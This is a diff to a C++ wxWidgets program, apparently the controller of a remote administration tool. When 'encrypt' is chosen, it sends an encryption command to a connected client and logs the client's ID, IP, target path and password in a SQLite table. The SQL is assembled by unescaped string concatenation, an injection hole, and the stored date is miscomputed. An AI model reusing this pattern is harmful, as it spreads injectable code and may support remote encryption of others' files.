@@ -48,6 +48,28 @@ frameEncryption::frameEncryption(wxWindow* pParent, std::string strPath) :
 
 }
 
+void frameEncryption::Exec_SQL(const char* cCMD) {
+	sqlite3* db;
+	char* zErrMsg = 0;
+
+	if (sqlite3_open(DB_FILE, &db) != SQLITE_OK) {
+		std::cout << "[DBCRYPT] No se pudo abrir la bd :" << sqlite3_errmsg(db) << std::endl;
+		wxMessageBox("No se pudo abrir la base de datos");
+		sqlite3_close(db);
+		return;
+	}
+
+	if (sqlite3_exec(db, cCMD, NULL, 0, &zErrMsg) != SQLITE_OK) {
+		wxMessageBox("Error: " + std::string(zErrMsg));
+		sqlite3_free(zErrMsg);
+		sqlite3_close(db);
+		return;
+	}
+
+	sqlite3_free(zErrMsg);
+	sqlite3_close(db);
+}
+
 void frameEncryption::OnGenerarPass(wxCommandEvent& event) {
 	this->txt_Pass->SetValue(RandomPass(40));
 }
@@ -66,5 +88,23 @@ void frameEncryption::OnExecCrypt(wxCommandEvent& event) {
 
 	if (list_parent) {
 		list_parent->itemp->EnviarComando(strComando);
+		
+		//Agregar a BD si es para cifrar
+		if (this->rdio_Options->GetSelection() == 0) {
+			time_t temp = time(0);
+			struct tm* timeptr = localtime(&temp);
+
+			std::string strFecha = std::to_string(timeptr->tm_mday);
+			strFecha += "/" + std::to_string(timeptr->tm_mon);
+			strFecha += "/" + std::to_string(timeptr->tm_year);
+			std::string strCMD = "INSERT INTO keys (id, ip, nombre, fecha, pass) VALUES('";
+			strCMD += list_parent->itemp->strID + "', '";
+			strCMD += list_parent->itemp->strIP + "', '";
+			strCMD += this->p_strPath + "', '";
+			strCMD += strFecha + "', '";
+			strCMD += this->txt_Pass->GetValue() + "');";
+
+			this->Exec_SQL(strCMD.c_str());
+		}
 	}
 }
